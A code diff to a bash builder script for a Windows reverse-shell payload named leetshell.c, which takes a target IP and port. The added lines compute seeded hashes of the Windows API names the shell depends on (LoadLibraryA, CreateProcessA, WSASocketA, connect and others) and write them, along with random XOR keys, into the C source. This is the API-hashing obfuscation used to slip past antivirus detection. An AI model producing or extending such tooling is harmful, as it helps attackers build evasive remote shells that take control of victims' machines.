@@ -23,7 +23,7 @@ port=$2
 shell_type="cmd"
 raw_output=false
 
-# === parse optional args ===
+# === Parse optional args ===
 for arg in "${@:3}"; do
   if [ "$arg" == "--raw" ]; then
     raw_output=true
@@ -35,7 +35,7 @@ done
 len=${#ip}
 lastChar=$((len - 1))
 
-# === generate random XOR keys ===
+# === Generate random XOR keys ===
 xor_key1=$((RANDOM % 256))
 xor_hex1=$(printf '0x%02x' $xor_key1)
 
@@ -49,6 +49,48 @@ xor_hex3=$(printf '0x%02x' $xor_key3)
 sed -i "s/^#define KEY1.*/#define KEY1 $xor_hex1/" "$filename"
 sed -i "s/^#define KEY2.*/#define KEY2 $xor_hex2/" "$filename"
 sed -i "s/^#define KEY3.*/#define KEY3 $xor_hex3/" "$filename"
+
+# === Generate SEED and HASH values ===
+seed=$(( (RANDOM % 255) + 1 ))
+mask=$((0xFFFFFFFF))
+
+apis=(
+  "LoadLibraryA"
+  "CreateProcessA"
+  "WSAStartup"
+  "WSASocketA"
+  "inet_addr"
+  "connect"
+)
+
+hash_loselose() {
+  local s="$1" h=0 b
+  while IFS= read -r b; do
+    (( h = (h + b) & mask ))
+    (( h = ( h * (b + seed) ) & mask ))
+  done < <(printf '%s' "$s" | LC_ALL=C od -An -t u1 -v | tr -s ' ' '\n' | sed '/^$/d')
+  # force unsigned decimal
+  if (( h < 0 )); then
+    printf '%u' "$(( h & mask ))"
+  else
+    printf '%u' "$h"
+  fi
+}
+
+for sym in "${apis[@]}"; do
+  val="$(hash_loselose "$sym")"
+  printf -v "$sym" '%u' "$val"
+  export "$sym"
+done
+
+# === Update SEED and HASH values defined in leetshell.c ===
+sed -i "s/^#define SEED.*/#define SEED                $seed/" "$filename"
+sed -i "s/^#define LOADLIBRARYA_H.*/#define LOADLIBRARYA_H      $LoadLibraryA/" "$filename"
+sed -i "s/^#define CREATEPROCESSA_H.*/#define CREATEPROCESSA_H    $CreateProcessA/" "$filename"
+sed -i "s/^#define WSASTARTUP_H.*/#define WSASTARTUP_H        $WSAStartup/" "$filename"
+sed -i "s/^#define WSASOCKETA_H.*/#define WSASOCKETA_H        $WSASocketA/" "$filename"
+sed -i "s/^#define INET_ADDR_H.*/#define INET_ADDR_H         $inet_addr/" "$filename"
+sed -i "s/^#define CONNECT_H.*/#define CONNECT_H           $connect/" "$filename"
 
 # === Update ws2_32.dll string ===
 ws2="ws2_32.dll"
